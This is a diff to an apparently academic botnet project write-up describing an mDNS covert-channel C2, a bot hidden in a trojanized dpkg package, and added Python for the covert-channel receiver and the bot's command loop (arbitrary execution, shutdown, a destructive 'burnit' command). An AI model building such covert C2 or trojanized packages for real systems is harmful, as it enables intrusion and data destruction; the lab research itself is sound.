@@ -22,13 +22,13 @@ Apart from this, the machines have a standard Ubuntu configuration. This include
 * No SE Linux 
 * No Apparmor
 * No AV Scanner
-* avahi enabled
+* Avahi enabled
 
 ## Networking
 The VMs are on a private network with addressing starting at 192.168.1.100. This network has internet access via NAT through a virtual Pf Sense Firewall (also serving as DNS and DHCP server). Internet access is not required to reproduce our bot procedures but was used to simulate traffic and to make our lives easier when configuring the VMs. As the bot does not have propagation capabilities, and the firewall was configured to drop any outgoing mDNS traffic, this was deemed safe by the group members.
 
 ## Traffic Simulation
-The normal expected traffic was simulated by the python script `trafficsim.py` in the bot repository. This bot would query google or perform a GET request to a number of websites repeatedly at random intervals from 1 to 15 seconds. Additionally, every cycle, the bot would perform a DNS query for a randomly selected site from the Alexa top 1 million list against 8.8.8.8. This bot was installed on each VM and auto-started on boot as a systemd service. 
+The normal expected traffic was simulated by the python script `trafficsim.py` in the trafficsim repository. This bot would query google or perform a GET request to a number of websites repeatedly at random intervals from 1 to 15 seconds. Additionally, every cycle, the bot would perform a DNS query for a randomly selected site from the Alexa top 1 million list against 8.8.8.8. This bot was installed on each VM and auto-started on boot as a systemd service. This is included as a resource in the submission archive.
 
 # Attack
 This attack scenario is a targeted compromise of an enterprise environment such as the worm with logic bomb payload that struck the Saudi Aramco company. The attack sequence as a general overview is as follows: An attacker compromises a host on the network via a poisoned dpkg package. Meanwhile, one of the hosts on the network segment must have the c2 server installed. This could be an attacker machine on the network or a compromised machine communicating with a remote attacker through a reverse shell.
@@ -58,8 +58,47 @@ The first two are rather self explanatory, however the checksum encoding is more
 ### Post-amble
 While post-amble may not be a word, it is a part of the AuRevior transmission. This is 1 window of data with a value of `0xFF` and qclass of 1. This simply notifies the receiver that the transmission is finished and does not contain any further data. 
 
+### Receiver Organization
+The receiver system is made up of 4 classes: Packet, Frame, Stream, and Receiver. A packet will come across the sniffing interface and the Receiver will check if it contains IP, UDP, and DNS data. If it does, the receiver matches the source IP of the packet against active streams. If there is not an active stream from that source IP, it will create one. The packet is then passed to the stream object which handles frame timing logic. The packet is then passed to the current active frame object and parsed for its actual data. As soon as the window closes on a frame, the stream calls `finalize()` on the frame, which converts the data into a bit array and figures out whether the frame was a preamble, data, or post-amble. If the last frame was a post-amble, the stream finalizes itself by checking the data payload against the 2 copies of the checksum and converts the result to a string. A client can then retrieve any finalized strings from the Receiver object. The stream finalize function is shown below.
 
-## The bot
+```python
+    def finalize(self):
+        """Stream final processing when terminator received"""
+        self.finalized = True
+        lasttime = 0
+        for i in self.frames:
+            # only parse data frames
+            if i.flag != 0:
+                continue
+            try:
+                data: str
+                data = i.payload.tobytes().decode()
+            except UnicodeError:
+                logging.error("Bad data frame!")
+                self.handle_bad_data()
+                return
+            self.payload += data
+            # Give it a big rx window tolerance
+            if lasttime != 0 and i.when - lasttime > 0.6:
+                logging.error("Packet data out of order")
+                self.handle_bad_data()
+                return
+            lasttime = i.when
+        # Check integrity of received data
+        payload_bits = bitarray.bitarray()
+        payload_bits.frombytes(bytes(self.payload, "utf8"))
+        calculated = calcsum(payload_bits)
+        if calculated != self.checksum or calculated != self.checksum2:
+            logging.error("Checksum failed!")
+            logging.debug("Expected sums: {}, {}\n Got sum: {}".format(self.checksum, self.checksum2, calculated))
+            self.handle_bad_data()
+            return
+        logging.debug("Got good checksum")
+        logging.info("Completed stream from {}: {}".format(self.addr, self.payload))
+```
+
+
+## The Bot
 The bot is an agent written in python, registered as a systemd service. It supports covert information exfiltration and arbitrary code execution.
 
 ### Installation
@@ -85,6 +124,36 @@ Modifications to `DEBIAN/control`:
 Depends: ca-certificates, libasound2 (>= 1.0.16), libatk-bridge2.0-0 (>= 2.5.3), libatk1.0-0 (>= 2.2.0), libatspi2.0-0 (>= 2.9.90), libc6 (>= 2.14), libc6 (>= 2.17), libc6 (>= 2.2.5), libcairo2 (>= 1.6.0), libcups2 (>= 1.6.0), libcurl3-gnutls | libcurl3-nss | libcurl4 | libcurl3, libdbus-1-3 (>= 1.5.12), libdrm2 (>= 2.4.38), libexpat1 (>= 2.0.1), libgbm1 (>= 8.1~0), libglib2.0-0 (>= 2.16.0), libglib2.0-0 (>= 2.39.4), libgtk-3-0 (>= 3.9.10), libgtk-3-0 (>= 3.9.10) | libgtk-4-1, libnspr4 (>= 2:4.9-2~), libnss3 (>= 2:3.22), libnss3 (>= 3.26), libpango-1.0-0 (>= 1.14.0), libsecret-1-0 (>= 0.18), libx11-6, libx11-6 (>= 2:1.4.99.1), libxcb1 (>= 1.9.2), libxcomposite1 (>= 1:0.4.4-1), libxdamage1 (>= 1:1.1), libxext6, libxfixes3, libxkbcommon0 (>= 0.4.1), libxkbfile1, libxrandr2, xdg-utils (>= 1.0.2), python3, python3-bitarray, scapy
 ```
 The additional packages will cause the `dpkg -i` install operation to fail, but this is again normal for a manual installation, the user must simply run `apt --fix-broken install` and everything will work perfectly with them none the wiser. 
+
+### Communication Logic
+Shown below is the main loop of the bot.
+
+```Python
+def communicate():
+	"""Handle communications with C2"""
+    global rx
+    for i in rx.messages:
+        if i.finalized and i.payload[0] == "c" and (i.payload[1:5] == id or i.payload[1:5] == "0000"):
+            logging.debug("got new command message: {}".format(i.payload))
+            rx.tlock.acquire()
+            rx.messages.remove(i)
+            rx.tlock.release()
+            load: str
+            load = i.payload[5:]
+            match load.split(":")[0]:
+                case "ping":
+                    handle_ping()
+                case "info":
+                    send_info()
+                case "burnit":
+                    burn()
+                case "shutdown":
+                    os.system("poweroff")
+                case "abx":
+                    arbitrary_exec(load[4:])
+                case _:
+                    logging.error("Bad command: {}".format(load))
+```
 
 ## Command and Control
 The bots use the C2 mDNS covert channel described in the "covert channel" section above. the bot constantly listens for mDNS traffic and will attempt to parse it. If the message is a command and is destined for the bot's ID (or the Multicast ID 0000), it will execute it and transmit a reply. The supported commands are: `ping`, `info`, `abx`, `shutdown`, and `burnit`. 
